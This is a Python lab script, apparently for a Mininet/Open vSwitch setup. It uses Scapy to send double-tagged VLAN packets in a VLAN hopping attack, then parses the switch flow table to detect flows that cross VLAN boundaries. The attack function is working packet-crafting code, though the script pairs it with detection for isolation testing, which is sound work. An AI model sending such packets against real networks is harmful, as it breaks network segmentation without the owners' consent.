import subprocess
import re
from scapy.all import *
from scapy.layers.l2 import Ether, Dot1Q
from scapy.layers.inet import IP, UDP
import random



# --- Scapy Attack Code ---

def test_vlan_hopping(datapath_ip, src_mac, iface, outer_vlan, inner_vlan):
    """
    Sends crafted double-tagged VLAN packets to test VLAN isolation.
    """
    # Create an Ethernet frame
    eth = Ether(src=src_mac, dst="00:00:00:00:20:02")

    # Add 802.1Q VLAN tags (outer and inner)
    dot1q_outer = Dot1Q(vlan=outer_vlan)  # Outer VLAN (VLAN 10)
    dot1q_inner = Dot1Q(vlan=inner_vlan)  # Inner VLAN (VLAN 20)

    # Add IP and UDP layers
    ip = IP(dst=datapath_ip, src="192.168.10.100")  # fake IP addresses
    udp = UDP(dport=80, sport=12345)

    # Craft the packet with outer and inner VLAN tags
    packet = eth / dot1q_outer / dot1q_inner / ip / udp

    print(f"[*] Sending double-tagged packet: Outer VLAN {outer_vlan}, Inner VLAN {inner_vlan}")
    sendp(packet, iface=iface, verbose=True)


# --- Flow Table Retrieval and Parsing Code ---

def get_flow_table(switch_name):
    try:
        command = f"ovs-ofctl dump-flows {switch_name}"
        output = subprocess.check_output(command, shell=True)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Error fetching flow table for {switch_name}: {e}")
        return None
    except Exception as e:
        print(f"Unexpected error: {e}")
        return None

# Function to extract key-value pairs from a flow entry string
def parse_flow_entry(flow_entry):
    flow_data = {}
    
    # Ignore lines that don't match the expected pattern (e.g., xid, other non-flow data)
    if "xid" in flow_entry or "OFPT" in flow_entry:
        return None
    
    # Regex pattern to capture key-value pairs like cookie=0x0, duration=1.838s, etc.
    pattern = re.compile(r"(\w+)=([\w:.]+)")
    
    # Find all key-value pairs in the flow entry
    matches = pattern.findall(flow_entry)
    
    for key, value in matches:
        flow_data[key] = value
    
    return flow_data



# Function to format and display the flow table
def print_formatted_flow_table(formatted_flows):
    if formatted_flows:
        headers = ['row_id', 'timestamp'] + list(formatted_flows[0].keys())
        formatted_flows_with_ids = [{'row_id': idx + 1, 'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"), **row} for idx, row in enumerate(formatted_flows)]
        
        # Adjust column widths based on the content
        column_widths = [max(len(str(row.get(key, ''))) for row in formatted_flows_with_ids + [dict.fromkeys(headers, key)]) for key in headers]
        
        header_row = " | ".join(f"{header:<{column_widths[i]}}" for i, header in enumerate(headers))
        print(header_row)
        print("-" * (sum(column_widths) + len(headers) - 1))
        
        for row in formatted_flows_with_ids:
            data_row = " | ".join(f"{str(row.get(key, '')):<{column_widths[i]}}" for i, key in enumerate(headers))
            print(data_row)
    else:
        print("No flow entries found.")

# Function to format the raw flow table into structured rows
def format_flow_table(flow_table):
    lines = flow_table.splitlines()
    formatted_flows = []
    
    for idx, line in enumerate(lines):
        if line.strip():  # Ignore empty lines
            flow_data = parse_flow_entry(line)
            if flow_data:  # Only add valid flow entries
                flow_data["id"] = idx + 1  # Assign a row ID based on line number
                formatted_flows.append(flow_data)
    
    return formatted_flows


# --- VLAN Hopping Detection Code ---

def find_all_attack_rows(formatted_flows, vlan10_ports, vlan20_ports):
    """
    Identifies all rows in the flow table where VLAN hopping occurs.
    
    :param formatted_flows: List of parsed flow entries.
    :param vlan10_ports: List of ports belonging to VLAN 10.
    :param vlan20_ports: List of ports belonging to VLAN 20.
    :return: List of detected attack rows with details.
    """
    attack_rows = []  # To store details of all detected attacks

    print(f"Debug: VLAN 10 Ports: {vlan10_ports}, VLAN 20 Ports: {vlan20_ports}")
    for flow in formatted_flows:
        in_port = flow.get("in_port")
        actions = flow.get("actions", "")
        
        print(f"Debug: Processing flow - in_port: {in_port}, actions: {actions}")
        
        if in_port is None or actions == "":
            print("Debug: Skipping flow due to missing fields")
            continue

        # Check if VLAN 10 ports communicate with VLAN 20 ports
        if int(in_port) in vlan10_ports:
            for port in vlan20_ports:
                if f"output:{port}" in actions:
                    print(f"Debug: VLAN hopping detected from VLAN 10 (port {in_port}) to VLAN 20 (port {port})")
                    attack_rows.append({
                        "row_id": flow.get("id"),
                        "from_vlan": 10,
                        "in_port": in_port,
                        "to_vlan": 20,
                        "output_port": port
                    })

        # Check if VLAN 20 ports communicate with VLAN 10 ports
        if int(in_port) in vlan20_ports:
            for port in vlan10_ports:
                if f"output:{port}" in actions:
                    print(f"Debug: VLAN hopping detected from VLAN 20 (port {in_port}) to VLAN 10 (port {port})")
                    attack_rows.append({
                        "row_id": flow.get("id"),
                        "from_vlan": 20,
                        "in_port": in_port,
                        "to_vlan": 10,
                        "output_port": port
                    })

    if not attack_rows:
        print("Debug: No VLAN hopping detected in the flow table.")

    return attack_rows


# --- Main Logic ---

def main():
    # Scapy Attack Parameters
    datapath_ip = "192.168.20.1"  # Target VLAN 20 host (h3)
    src_mac = "00:11:22:33:{:02x}:{:02x}:{:02x}".format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
    iface = "h1-eth0"  # Interface on h1 to send the attack from
    outer_vlan = 10
    inner_vlan = 20

    # Example ports for VLANs
    vlan10_ports = [1, 2]  # Ports assigned to VLAN 10
    vlan20_ports = [3, 4]  # Ports assigned to VLAN 20

    # Get flow table and process it
    switch_name = "s1"  # Name of the switch
    print("[*] Starting VLAN hopping attack...")
    test_vlan_hopping(datapath_ip, src_mac, iface, outer_vlan, inner_vlan)
    print("[*] Attack complete.")

    print("[*] Fetching flow table...")
    flow_table = get_flow_table(switch_name)
    
    if flow_table:
        formatted_flows = format_flow_table(flow_table)
        print(f"\nFlow table for {switch_name}:")
        print_formatted_flow_table(formatted_flows)
        
        attack_rows = find_all_attack_rows(formatted_flows, vlan10_ports, vlan20_ports)

        if attack_rows:
            print("\nDetected attacks:")
            for attack in attack_rows:
                print(f"Row ID: {attack['row_id']}, VLAN {attack['from_vlan']} (port {attack['in_port']}) -> "
                      f"VLAN {attack['to_vlan']} (port {attack['output_port']})")
        else:
            print("\nNo attacks detected.")
    else:
        print(f"Failed to retrieve flow table for {switch_name}.")

if __name__ == "__main__":
    main()
